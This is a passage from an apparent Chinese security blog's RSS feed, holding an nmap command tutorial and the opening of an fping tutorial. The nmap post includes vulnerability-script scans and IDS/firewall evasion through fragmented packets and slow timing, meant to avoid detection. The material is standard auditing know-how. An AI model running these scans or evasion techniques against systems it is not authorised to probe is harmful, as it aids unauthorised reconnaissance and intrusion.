&lt;/h2>&lt;p>&lt;code>msfconsole&lt;/code> 是一个功能强大的渗透测试工具，适用于多种安全测试场景，包括漏洞利用、后渗透攻击和自动化攻击。通过掌握基本语法和高级用法，可以快速定位网络中的漏洞并进行安全审计。&lt;/p></description></item><item><title>Nmap命令使用</title><link>https://souljian.cn/p/745161154/</link><pubDate>Sun, 20 Apr 2025 22:59:14 +0800</pubDate><guid>https://souljian.cn/p/745161154/</guid><description>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>&lt;code>nmap&lt;/code> 是一款开源的网络探测和安全审核工具，可以用来扫描网络主机，确定哪些主机在运行、运行哪些服务以及运行哪个操作系统等信息。它支持多种扫描技术，能够识别网络上的活跃设备、开放端口、运行服务和操作系统类型。&lt;/p>
&lt;h2 id="二安装">二、安装
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Debian/Ubuntu&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install nmap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>CentOS/RHEL&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo yum install nmap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Arch Linux&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo pacman -S nmap
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>目标&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用选项">四、常用选项
&lt;/h2>&lt;h3 id="一扫描类型">（一）扫描类型
&lt;/h3>&lt;ul>
&lt;li>&lt;code>-sS&lt;/code>：TCP SYN 扫描（半开放扫描）。&lt;/li>
&lt;li>&lt;code>-sT&lt;/code>：TCP 连接扫描。&lt;/li>
&lt;li>&lt;code>-sU&lt;/code>：UDP 扫描。&lt;/li>
&lt;li>&lt;code>-sP&lt;/code>：仅进行主机发现。&lt;/li>
&lt;li>&lt;code>-sV&lt;/code>：服务版本检测。&lt;/li>
&lt;li>&lt;code>-O&lt;/code>：操作系统检测。&lt;/li>
&lt;/ul>
&lt;h3 id="二端口指定">（二）端口指定
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-p &amp;lt;端口&amp;gt;&lt;/code>：指定扫描的端口范围。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p 80,443 target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-p-&lt;/code>：扫描所有 65535 个端口。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p- target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="三输出选项">（三）输出选项
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-oN &amp;lt;文件&amp;gt;&lt;/code>：将扫描结果保存到普通文本文件。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -oN scan_results.txt target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-oX &amp;lt;文件&amp;gt;&lt;/code>：将扫描结果保存为 XML 格式。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -oX scan_results.xml target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-oG &amp;lt;文件&amp;gt;&lt;/code>：将扫描结果保存为 Grepable 格式。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -oG scan_results.gnmap target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="四其他选项">（四）其他选项
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;code>-v&lt;/code>：详细模式，显示更多信息。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -v target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-A&lt;/code>：启用操作系统和服务版本检测。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -A target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-T &amp;lt;级别&amp;gt;&lt;/code>：设置扫描速度（0 最慢，5 最快）。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -T4 target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>-Pn&lt;/code>：跳过主机发现，直接扫描指定主机。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="五高级功能与选项">五、高级功能与选项
&lt;/h2>&lt;h3 id="一服务版本检测">（一）服务版本检测
&lt;/h3>&lt;p>使用 &lt;code>-sV&lt;/code> 选项可以检测目标主机开放端口上运行的服务及其版本信息。这对于漏洞扫描和服务识别非常有用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sV target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="二操作系统检测">（二）操作系统检测
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 可以通过分析网络堆栈，尝试识别目标主机的操作系统类型和版本：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -O target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="三脚本扫描">（三）脚本扫描
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 的脚本引擎（NSE）支持数百个脚本，涵盖从服务检测到漏洞扫描、恶意软件检测、Brute-force 攻击等多种用途。例如，使用漏洞扫描脚本集：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --script vuln target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="四扫描速度控制">（四）扫描速度控制
&lt;/h3>&lt;p>在高流量或防火墙严格的网络环境中，可以通过 &lt;code>-T&lt;/code> 选项调整扫描速度（0为最慢，5为最快）。例如，快速扫描：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -T4 target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="五防火墙规避">（五）防火墙规避
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 提供了一些技术来规避防火墙和入侵检测系统（IDS），例如使用碎片化数据包（&lt;code>-f&lt;/code>）、修改扫描速率（&lt;code>-T0&lt;/code> 至 &lt;code>-T5&lt;/code>）。&lt;/p>
&lt;h3 id="六并发扫描与负载优化">（六）并发扫描与负载优化
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 支持并发扫描和负载优化，以提高扫描效率。例如，禁用主机发现（&lt;code>-Pn&lt;/code>）和 DNS 解析（&lt;code>-n&lt;/code>）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn -n target_ip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="七自定义数据包发送">（七）自定义数据包发送
&lt;/h3>&lt;p>高级用户可以利用 &lt;code>nmap&lt;/code> 构建和发送自定义数据包，例如通过 &lt;code>--data-length&lt;/code>、&lt;code>--data-string&lt;/code> 等参数。&lt;/p>
&lt;h3 id="八网络拓扑发现与可视化">（八）网络拓扑发现与可视化
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 可以结合 &lt;code>traceroute&lt;/code> 绘制网络拓扑图，展示网络设备之间的连接关系。&lt;/p>
&lt;h3 id="九漏洞扫描与安全审计">（九）漏洞扫描与安全审计
&lt;/h3>&lt;p>借助 NSE 脚本，&lt;code>nmap&lt;/code> 可以进行各种漏洞扫描，包括已知漏洞的检测和配置错误的识别。&lt;/p>
&lt;h3 id="十结果输出与报告生成">（十）结果输出与报告生成
&lt;/h3>&lt;p>&lt;code>nmap&lt;/code> 支持多种结果输出格式，如标准输出、XML 格式（&lt;code>-oX&lt;/code>）、Grepable 格式（&lt;code>-oG&lt;/code>）。&lt;/p>
&lt;h2 id="六使用示例">六、使用示例
&lt;/h2>&lt;h3 id="一基本扫描">（一）基本扫描
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>扫描单个主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>扫描多个主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 192.168.1.1-10
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>扫描特定端口&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p 80,443 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="二高级扫描">（二）高级扫描
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>服务版本检测&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>操作系统检测&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -O 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>快速扫描&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -F 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>扫描网络中的所有主机&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sP 192.168.1.0/24
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="三脚本扫描-1">（三）脚本扫描
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>使用 NSE 脚本进行漏洞扫描&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --script vuln 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>使用特定脚本&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap --script http-title 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="四防火墙规避">（四）防火墙规避
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>使用碎片化数据包&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -f 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>调整扫描速度&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -T0 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="五并发扫描与负载优化">（五）并发扫描与负载优化
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>&lt;strong>禁用主机发现和 DNS 解析&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -Pn -n 192.168.1.100
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="七注意事项">七、注意事项
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>权限问题&lt;/strong>：某些扫描类型（如 &lt;code>-sS&lt;/code>）需要管理员权限才能运行。&lt;/li>
&lt;li>&lt;strong>网络环境&lt;/strong>：某些网络环境可能限制 ICMP 请求或特定端口的扫描。&lt;/li>
&lt;li>&lt;strong>扫描速度&lt;/strong>：在高流量或防火墙严格的网络环境中，需要调整扫描速度以避免被检测到。&lt;/li>
&lt;li>&lt;strong>结果输出&lt;/strong>：使用 &lt;code>-oN&lt;/code>、&lt;code>-oX&lt;/code>、&lt;code>-oG&lt;/code> 等选项保存扫描结果，便于后续分析。&lt;/li>
&lt;/ol>
&lt;h2 id="八总结">八、总结
&lt;/h2>&lt;p>&lt;code>nmap&lt;/code> 是一个功能强大的网络扫描工具，适用于多种场景，包括网络发现、端口扫描、服务检测、操作系统识别和漏洞扫描。通过掌握基本语法和高级功能，可以快速定位网络中的设备和服务，帮助进行网络管理和安全审计。&lt;/p></description></item><item><title>Fping命令使用</title><link>https://souljian.cn/p/745153393/</link><pubDate>Sun, 20 Apr 2025 20:49:53 +0800</pubDate><guid>https://souljian.cn/p/745153393/</guid><description>&lt;h1 id="">
&lt;/h1>&lt;h2 id="一简介">一、简介
&lt;/h2>&lt;p>&lt;code>fping&lt;/code> 是一个用于发送 ICMP Echo 请求的工具，类似于 &lt;code>ping&lt;/code>，但它可以同时对多个主机进行 ICMP Echo 请求，并且输出结果更加简洁。它特别适合用于批量检测主机的存活性。&lt;/p>
&lt;h2 id="二安装">二、安装
&lt;/h2>&lt;ul>
&lt;li>
&lt;p>&lt;strong>Debian/Ubuntu&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install fping
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>CentOS/RHEL&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo yum install fping
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;strong>Arch Linux&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo pacman -S fping
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="三基本语法">三、基本语法
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">fping &lt;span class="o">[&lt;/span>选项&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>主机列表&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="四常用选项">四、常用选项
&lt;/h2>&lt;ul>
&lt;li>&lt;code>-a&lt;/code>：仅显示存活的主机。&lt;/li>
&lt;li>&lt;code>-b&lt;/code>：设置 ping 数据包的大小（默认为 56 字节）。&lt;/li>
&lt;li>&lt;code>-c&lt;/code>：设置每个目标的 ping 次数（默认为 1）。&lt;/li>
&lt;li>&lt;code>-f&lt;/code>：从文件获取目标列表（不能与 &lt;code>-g&lt;/code> 同时使用）。&lt;/li>
&lt;li>&lt;code>-g&lt;/code>：通过指定起始和结束地址来生成目标列表，可以是网段。&lt;/li>
&lt;li>&lt;code>-l&lt;/code>：循环发送 ping。&lt;/li>
&lt;li>&lt;code>-u&lt;/code>：显示不可到达的目标。&lt;/li>
&lt;li>&lt;code>-s&lt;/code>：显示统计信息，包括发送和接收的 ICMP Echo 请求数量。&lt;/li>
&lt;/ul>
&lt;h2 id="五使用示例">五、使用示例
